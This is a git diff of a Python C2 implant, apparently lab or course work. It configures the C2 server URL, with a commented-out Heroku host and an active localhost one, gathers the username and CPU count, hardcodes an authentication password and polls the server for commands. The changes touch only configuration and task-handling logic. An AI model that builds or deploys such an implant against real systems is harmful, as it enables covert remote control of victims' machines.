@@ -12,7 +12,8 @@ import base64
 
 ### configs ###
 
-c2_url = "http://127.0.0.1:5000"
+# c2_url = "https://c2-server-app.herokuapp.com"
+c2_url = "http://127.0.0.1:5000/"
 register_uri = "/agent/register"
 get_task_uri = "/agent/get_task"
 send_results_uri = "/agent/send_results"
@@ -36,7 +37,7 @@ def init_data():
     whoami = os.getlogin()
     cpus = os.cpu_count()
     agent_id = os.urandom(16).hex() # a random value that is unqiue to this implant
-    password = "19c0bf4143f96e80000546386d48491c442b0e431166fa78a8505264b0bd1134" # hex value of sha256 "ch0nky"; for testing purposes
+    password = "magic_conch" # hex value of sha256 "ch0nky"; for testing purposes
     return {"whoami": whoami, "agent_id": agent_id, "password": password, "cpus": cpus}
 
 data = init_data()
@@ -79,10 +80,10 @@ def get_task():
     r = requests.post(c2_url + get_task_uri, data=encrypt_data(data))
     if r.status_code == 200:
         resp = decrypt_data(r.content)
-        if len(resp) == 0: ## no task available
-            print("[+] No task available")
-            return False
-        elif resp["status"] == "ok":
+        # if len(resp) == 0: ## no task available
+        #     print("[+] No task available")
+        #     return False
+        if resp["status"] == "ok":
             latest_job_id = resp["job_id"]
             print("[+] Got task from C2 server")
             print("[+] Job ID:", latest_job_id)
@@ -90,7 +91,7 @@ def get_task():
             print("[+] Command:", resp["cmd"])
             return True
         else:
-            print("[-] Agent failed to get task from C2", resp)
+            print("[-] Agent gets no task from server", resp)
             return False
     else:
         print("[-] Agent failed to get task from C2")
